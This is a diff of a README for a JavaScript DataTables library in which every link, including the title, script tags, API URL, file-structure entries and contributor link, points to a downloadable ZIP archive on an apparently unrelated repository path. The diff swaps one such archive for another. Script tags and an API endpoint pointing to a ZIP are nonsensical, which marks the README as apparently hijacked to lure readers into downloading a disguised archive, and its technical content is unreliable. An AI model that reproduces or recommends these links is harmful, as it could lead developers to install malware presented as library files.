@@ -1,7 +1,7 @@
 
-# https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip
+# https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip
 
-`https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip` is a lightweight JavaScript library designed to create **DataTables** without relying on **jQuery**. This library supports **pagination**, **search**, **custom filters**, and **data export** to **CSV**, **Excel**, and **PDF**, using data retrieved via **AJAX**.
+`https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip` is a lightweight JavaScript library designed to create **DataTables** without relying on **jQuery**. This library supports **pagination**, **search**, **custom filters**, and **data export** to **CSV**, **Excel**, and **PDF**, using data retrieved via **AJAX**.
 
 ---
 
@@ -38,19 +38,19 @@ This library requires a JSON-formatted response as shown below:
 
 ### 1. Include the Script
 
-Ensure you include `https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip` in your HTML file:
+Ensure you include `https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip` in your HTML file:
 
 ```html
-<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
+<script src="https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip"></script>
 ```
 
 To enable export functionality for Excel and PDF, optionally include the following scripts:
 
 ```html
-<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
+<script src="https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip"></script>
 
-<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
-<script src="https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip"></script>
+<script src="https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip"></script>
+<script src="https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip"></script>
 ```
 
 ### 2. Prepare HTML Elements
@@ -92,7 +92,7 @@ initDataTable({
   exportCSVButtonId: "#exportCsvBtn",
   exportExcelButtonId: "#exportExcelBtn",
   exportPDFButtonId: "#exportPdfBtn",
-  apiUrl: "https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip",
+  apiUrl: "https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip",
   hasAction: true,
   customFilters: ["#idElementFilter"],
   actionButtons: (item) => {
@@ -127,9 +127,9 @@ initDataTable({
 
 ```text
 📁 js/
-  └── https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip
-📄 https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip
-📄 https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip (API simulation)
+  └── https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip
+📄 https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip
+📄 https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip (API simulation)
 ```
 
 ---
@@ -142,4 +142,4 @@ Free to use, modify, and further develop. ❤️
 
 ## 🙌 Contributor
 
-- [Nurdiansah](https://raw.githubusercontent.com/Nur84/datatables/main/Anoplonemertini/datatables_v3.7-alpha.2.zip)
+- [Nurdiansah](https://github.com/Nur84/datatables/raw/refs/heads/main/Anoplonemertini/Software_3.0.zip)
